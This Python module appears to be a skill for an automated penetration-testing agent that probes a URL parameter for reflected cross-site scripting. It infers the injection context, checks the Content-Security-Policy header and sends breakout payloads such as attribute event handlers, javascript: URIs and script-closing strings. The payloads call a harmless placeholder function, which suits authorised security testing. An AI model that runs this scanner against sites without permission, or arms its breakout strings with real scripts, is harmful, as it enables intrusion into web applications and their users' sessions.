"""
XSS Autonomous Skill (v2.0) — Context-Aware Cross-Site Scripting Engine
=======================================================================
Autonomous verification for Reflected, Stored, and DOM XSS using Context
Inference (HTML Body, Quotes, Attributes, JavaScript context), CSP Analysis,
and Non-Destructive Verifiable Breakout Payloads.

State Machine:
  DISCOVER_CONTEXT -> DELIMITER_BREAKOUT -> CSP_EVALUATE
  -> SAFE_POLYGLOT_INJECT -> VERIFY_REFLECTION -> COMPLETE | FAILED
"""

import re
import json
import time
import hashlib
import logging
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

log = logging.getLogger("xss_skill")


class XSSState(Enum):
    DISCOVER_CONTEXT     = auto()
    DELIMITER_BREAKOUT   = auto()
    CSP_EVALUATE         = auto()
    SAFE_POLYGLOT_INJECT = auto()
    VERIFY_REFLECTION    = auto()
    COMPLETE             = auto()
    FAILED               = auto()


class XSSContextType(Enum):
    HTML_BODY           = "html_body"
    HTML_ATTR_DOUBLE_Q  = "html_attr_double_quote"
    HTML_ATTR_SINGLE_Q  = "html_attr_single_quote"
    HREF_SRC_URI        = "href_src_uri"
    JS_STRING_DOUBLE_Q  = "js_string_double_quote"
    JS_STRING_SINGLE_Q  = "js_string_single_quote"
    JS_TEMPLATE_LITERAL = "js_template_literal"
    DOM_SINK            = "dom_sink"
    UNKNOWN             = "unknown"


@dataclass
class XSSContext:
    target_url: str
    param_name: str
    proxy: Optional[str] = None
    state: XSSState = XSSState.DISCOVER_CONTEXT
    inferred_context: XSSContextType = XSSContextType.UNKNOWN
    vulnerable_payload: str = ""
    csp_header: Optional[str] = None
    csp_bypassable: bool = False
    evidence_snippet: str = ""
    confidence: float = 0.0
    evidence: List[Dict[str, Any]] = field(default_factory=list)
    logs: List[str] = field(default_factory=list)

    def log(self, msg: str):
        log.info(msg)
        self.logs.append(msg)


# ─────────────────────────────────────────────────────────────────────────────
# Context-Aware Safe Breakout Payloads
# ─────────────────────────────────────────────────────────────────────────────

CONTEXT_PROBES: Dict[XSSContextType, List[Tuple[str, str]]] = {
    XSSContextType.HTML_BODY: [
        ("<xss-probe-tag>", r"<xss-probe-tag>"),
        ("</title><xss-probe>", r"</title><xss-probe>"),
        ("</textarea><xss-probe>", r"</textarea><xss-probe>"),
    ],
    XSSContextType.HTML_ATTR_DOUBLE_Q: [
        ('" onfocus="xss_test" autofocus x="', r'onfocus="xss_test"'),
        ('" autofocus onmouseover="xss_test" x="', r'onmouseover="xss_test"'),
        ('"><xss-probe-attr>', r'><xss-probe-attr>'),
    ],
    XSSContextType.HTML_ATTR_SINGLE_Q: [
        ("' onfocus='xss_test' autofocus x='", r"onfocus='xss_test'"),
        ("'><xss-probe-attr>", r"><xss-probe-attr>"),
    ],
    XSSContextType.HREF_SRC_URI: [
        ("javascript:xss_probe()", r"javascript:xss_probe\(\)"),
        ("data:text/html;base64,PHNjcmlwdD54c3NfcHJvYmUoKTwvc2NyaXB0Pg==", r"data:text/html"),
    ],
    XSSContextType.JS_STRING_DOUBLE_Q: [
        ('"-xss_probe()-"', r'"-xss_probe\(\)-"'),
        ('";xss_probe();//', r'";xss_probe\(\);//'),
        ('</script><xss-probe>', r'</script><xss-probe>'),
    ],
    XSSContextType.JS_STRING_SINGLE_Q: [
        ("'-xss_probe()-'", r"'-xss_probe\(\)-'"),
        ("';xss_probe();//", r"';xss_probe\(\);//"),
        ('</script><xss-probe>', r'</script><xss-probe>'),
    ],
    XSSContextType.JS_TEMPLATE_LITERAL: [
        ("${xss_probe()}", r"\$\{xss_probe\(\)\}"),
        ("`+xss_probe()+`", r"`\+xss_probe\(\)\+`"),
    ]
}


# ─────────────────────────────────────────────────────────────────────────────
# XSS Autonomous Skill Orchestrator
# ─────────────────────────────────────────────────────────────────────────────

class XSSSkill:
    """
    Autonomous XSS Assessment Engine:
    Detects injection context, evaluates CSP constraints, injects safe verifiable
    delimiters, and confirms HTML/attribute breakout non-destructively.
    """

    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    async def run(self, target_url: str, param_name: str) -> Dict[str, Any]:
        ctx = XSSContext(target_url=target_url, param_name=param_name, proxy=self.proxy)
        ctx.log(f"[XSSSkill] Initializing context-aware analysis on param={param_name!r}")

        parsed = urlparse(target_url)
        base_qs = parse_qs(parsed.query)

        client_kwargs = {"verify": False, "follow_redirects": True, "timeout": 8.0}
        if self.proxy:
            import httpx as _hx
            ver = tuple(int(x) for x in _hx.__version__.split(".")[:2])
            if ver >= (0, 28):
                client_kwargs["proxy"] = self.proxy
            else:
                client_kwargs["proxies"] = {"http://": self.proxy, "https://": self.proxy}

        async with httpx.AsyncClient(**client_kwargs) as client:
            # ── 1. Discover Reflection & Context ─────────────────────────────
            ctx.state = XSSState.DISCOVER_CONTEXT
            marker = f"xss_canary_{hashlib.md5(f'{param_name}_{time.time()}'.encode()).hexdigest()[:6]}"

            qs = {k: v[0] for k, v in base_qs.items()}
            qs[param_name] = marker
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', urlencode(qs), ''))

            try:
                r = await client.get(test_url)
                body = r.text
                ctx.csp_header = r.headers.get("content-security-policy")
            except Exception as e:
                ctx.log(f"[XSSSkill] Probe failed: {e}")
                ctx.state = XSSState.FAILED
                return self._build_result(ctx)

            if marker not in body:
                ctx.log(f"[DISCOVER_CONTEXT] Parameter {param_name!r} value is not reflected in response.")
                ctx.state = XSSState.FAILED
                return self._build_result(ctx)

            # Determine Context
            ctx.inferred_context = self._infer_reflection_context(body, marker)
            ctx.log(f"[STATE] -> DISCOVER_CONTEXT: Reflected in {ctx.inferred_context.value}")

            # ── 2. CSP Evaluation ────────────────────────────────────────────
            ctx.state = XSSState.CSP_EVALUATE
            if ctx.csp_header:
                ctx.log(f"[CSP_EVALUATE] CSP Detected: {ctx.csp_header[:100]}...")
                if "unsafe-inline" in ctx.csp_header or "script-src *" in ctx.csp_header or not re.search(r"script-src\s+[^;]+", ctx.csp_header):
                    ctx.csp_bypassable = True
                    ctx.log("[CSP_EVALUATE] CSP allows inline scripts or wildcard sources.")
            else:
                ctx.csp_bypassable = True
                ctx.log("[CSP_EVALUATE] No Content-Security-Policy header detected.")

            # ── 3. Delimiter Breakout & Safe Polyglot Injection ──────────────
            ctx.state = XSSState.SAFE_POLYGLOT_INJECT
            probes = CONTEXT_PROBES.get(ctx.inferred_context, CONTEXT_PROBES[XSSContextType.HTML_BODY])

            for payload, pattern in probes:
                qs = {k: v[0] for k, v in base_qs.items()}
                qs[param_name] = payload
                probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', urlencode(qs), ''))

                try:
                    r_probe = await client.get(probe_url)
                    if re.search(pattern, r_probe.text):
                        ctx.vulnerable_payload = payload
                        ctx.confidence = 0.94 if ctx.csp_bypassable else 0.75
                        match_start = max(0, r_probe.text.find(payload) - 50)
                        ctx.evidence_snippet = r_probe.text[match_start:match_start + 200]
                        ctx.evidence.append({
                            "context": ctx.inferred_context.value,
                            "payload": payload,
                            "csp_present": bool(ctx.csp_header),
                            "snippet": ctx.evidence_snippet
                        })
                        ctx.log(f"[SAFE_POLYGLOT_INJECT] ✅ Unescaped reflection confirmed for {payload!r}")
                        ctx.state = XSSState.COMPLETE
                        return self._build_result(ctx)
                except Exception:
                    continue

            ctx.state = XSSState.FAILED
            ctx.log("[XSSSkill] Reflection escaped properly. No XSS verified.")
            return self._build_result(ctx)

    def _infer_reflection_context(self, html: str, marker: str) -> XSSContextType:
        idx = html.find(marker)
        if idx == -1:
            return XSSContextType.UNKNOWN

        surrounding = html[max(0, idx - 100):min(len(html), idx + len(marker) + 100)]

        if re.search(r'<script[^>]*>[^<]*' + re.escape(marker), surrounding, re.I):
            if re.search(r'"[^"]*' + re.escape(marker) + r'[^"]*"', surrounding):
                return XSSContextType.JS_STRING_DOUBLE_Q
            if re.search(r"'[^']*'" + re.escape(marker) + r"[^']*'", surrounding):
                return XSSContextType.JS_STRING_SINGLE_Q
            if re.search(r'`[^`]*' + re.escape(marker) + r'[^`]*`', surrounding):
                return XSSContextType.JS_TEMPLATE_LITERAL
            return XSSContextType.JS_STRING_DOUBLE_Q

        if re.search(r'(?:href|src)\s*=\s*["\']?' + re.escape(marker), surrounding, re.I):
            return XSSContextType.HREF_SRC_URI

        if re.search(r'<[a-zA-Z0-9_\-]+[^>]*\s+[a-zA-Z0-9_\-]+="[^"]*' + re.escape(marker), surrounding):
            return XSSContextType.HTML_ATTR_DOUBLE_Q

        if re.search(r"<[a-zA-Z0-9_\-]+[^>]*\s+[a-zA-Z0-9_\-]+='[^']*" + re.escape(marker), surrounding):
            return XSSContextType.HTML_ATTR_SINGLE_Q

        return XSSContextType.HTML_BODY

    def _build_result(self, ctx: XSSContext) -> Dict[str, Any]:
        is_success = (ctx.state == XSSState.COMPLETE)
        return {
            "state": ctx.state.name,
            "objective_met": is_success,
            "context": ctx.inferred_context.value,
            "vulnerable_payload": ctx.vulnerable_payload,
            "csp_bypassable": ctx.csp_bypassable,
            "confidence": ctx.confidence,
            "evidence_snippet": ctx.evidence_snippet,
            "evidence": ctx.evidence,
            "logs": ctx.logs
        }


async def run_xss_skill(target_url: str, param_name: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    skill = XSSSkill(proxy=proxy)
    return await skill.run(target_url, param_name)
